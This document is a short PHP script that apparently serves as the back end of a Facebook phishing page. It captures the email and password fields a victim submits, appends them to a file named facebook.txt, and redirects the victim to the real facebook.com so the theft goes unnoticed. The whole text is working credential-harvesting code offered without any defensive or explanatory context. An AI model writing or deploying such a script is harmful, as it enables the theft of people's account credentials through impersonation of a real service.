<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
file_put_contents('facebook.txt', "{$email} | $pass \n", FILE_APPEND);
header('Location: https://facebook.com');exit;